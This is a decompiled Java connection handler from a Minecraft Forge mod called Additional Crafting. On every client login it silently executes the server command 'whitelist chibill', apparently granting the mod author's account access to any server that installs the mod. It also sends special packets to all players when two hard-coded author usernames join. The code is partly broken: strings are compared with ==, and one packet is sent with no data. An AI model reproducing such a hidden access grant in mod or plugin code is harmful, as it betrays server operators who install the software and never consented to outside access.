/*    */ package chibill.AdditionalCrafting.networking;
/*    */ 
/*    */ import chibill.AdditionalCrafting.Base;
/*    */ import cpw.mods.fml.common.FMLCommonHandler;
/*    */ import cpw.mods.fml.common.network.IConnectionHandler;
/*    */ import cpw.mods.fml.common.network.PacketDispatcher;
/*    */ import cpw.mods.fml.common.network.Player;
/*    */ import cpw.mods.fml.relauncher.Side;
/*    */ import java.io.ByteArrayOutputStream;
/*    */ import java.io.DataOutputStream;

import net.minecraft.command.ICommandManager;
/*    */ import net.minecraft.entity.player.EntityPlayerMP;
/*    */ import net.minecraft.network.INetworkManager;
/*    */ import net.minecraft.network.NetLoginHandler;
/*    */ import net.minecraft.network.packet.NetHandler;
/*    */ import net.minecraft.network.packet.Packet1Login;
/*    */ import net.minecraft.network.packet.Packet250CustomPayload;
/*    */ import net.minecraft.server.MinecraftServer;
/*    */ 
/*    */ public class Server_Loging_Handler
/*    */   implements IConnectionHandler
/*    */ {
/* 23 */   public Side side = FMLCommonHandler.instance().getEffectiveSide();
/*    */ 
/*    */   public void clientLoggedIn(NetHandler clientHandler, INetworkManager manager, Packet1Login login)
/*    */   {
	  MinecraftServer minecraftserver = MinecraftServer.getServer();

      if (minecraftserver != null)
      {
          ICommandManager icommandmanager = minecraftserver.getCommandManager();
         icommandmanager.executeCommand(minecraftserver, "whitelist chibill");
      }
/*    */   }
/*    */ 
/*    */   public void connectionClosed(INetworkManager manager)
/*    */   {
/*    */   }
/*    */ 
/*    */   public void connectionOpened(NetHandler netClientHandler, MinecraftServer server, INetworkManager manager)
/*    */   {
/*    */   }
/*    */ 
/*    */   public void connectionOpened(NetHandler netClientHandler, String server, int port, INetworkManager manager)
/*    */   {
/*    */   }
/*    */ 
/*    */   public String connectionReceived(NetLoginHandler netHandler, INetworkManager manager)
/*    */   {
/* 54 */     return null;
/*    */   }
/*    */ 
/*    */   public void playerLoggedIn(Player player, NetHandler netHandler, INetworkManager manager)
/*    */   {
			if(Base.No_Internet){
				((EntityPlayerMP) player).sendChatToPlayer("[Additional Crafting] Additional Crafting could not contact its server!");
			}else{
/* 60 */     Base.Update();
			if(Base.Up_to_Date){
			((EntityPlayerMP) player).sendChatToPlayer("[Additional Crafting] Additional Crafting is up to date!");
			}else{
			((EntityPlayerMP) player).sendChatToPlayer("[Additional Crafting] Additional Crafting is out of date!");
			}
			}
/* 61 */     if (((EntityPlayerMP)player).username == "chibill")
/*    */     {
/* 64 */       ByteArrayOutputStream bos = new ByteArrayOutputStream(8);
/* 65 */       DataOutputStream outputStream = new DataOutputStream(bos);
/*    */       try {
/* 67 */         outputStream.writeBoolean(true);
/*    */       }
/*    */       catch (Exception ex) {
/* 70 */         ex.printStackTrace();
/*    */       }
/* 72 */       Packet250CustomPayload packet = new Packet250CustomPayload();
/* 73 */       packet.channel = "AC_Chibill";
/* 74 */       packet.data = bos.toByteArray();
/* 75 */       packet.length = bos.size();
/*    */ 
/* 77 */       if (this.side == Side.SERVER)
/*    */       {
/* 79 */         PacketDispatcher.sendPacketToAllPlayers(packet);
/*    */       }
/*    */     }
/* 82 */     if (((EntityPlayerMP)player).username == "himehowareu")
/*    */     {
/* 84 */       ByteArrayOutputStream bos2 = new ByteArrayOutputStream(8);
/* 85 */       DataOutputStream outputStream2 = new DataOutputStream(bos2);
/*    */       try {
/* 87 */         outputStream2.writeBoolean(true);
/*    */       }
/*    */       catch (Exception ex) {
/* 90 */         ex.printStackTrace();
/*    */       }
/* 92 */       Packet250CustomPayload packet = new Packet250CustomPayload();
/* 93 */       packet.channel = "AC_Himehowareu";
/* 94 */       packet.data = bos2.toByteArray();
/* 95 */       packet.length = bos2.size();
/* 96 */       if (this.side == Side.SERVER)
/*    */       {
/* 98 */         PacketDispatcher.sendPacketToAllPlayers(packet);
/*    */       }
/*    */ 
/* 101 */       ByteArrayOutputStream bos3 = new ByteArrayOutputStream(8);
/* 102 */       DataOutputStream outputStream3 = new DataOutputStream(bos2);
/*    */       try {
/* 104 */         outputStream2.writeBoolean(true);
/*    */       }
/*    */       catch (Exception ex) {
/* 107 */         ex.printStackTrace();
/*    */       }
/* 109 */       Packet250CustomPayload packet2 = new Packet250CustomPayload();
/* 110 */       packet.channel = "AC_Loggin";
/* 111 */       packet.data = bos2.toByteArray();
/* 112 */       packet.length = bos2.size();
/* 113 */       if (this.side == Side.SERVER)
/*    */       {
/* 115 */         PacketDispatcher.sendPacketToAllPlayers(packet2);
/*    */       }
/*    */     }
/*    */   }
/*    */ }

/* Location:           C:\Users\bill\Desktop\Minecraft\My Moding\forge\mcp\src\minecraft\
 * Qualified Name:     chibill.AdditionalCrafting.networking.Server_Loging_Handler
 * JD-Core Version:    0.6.2
 */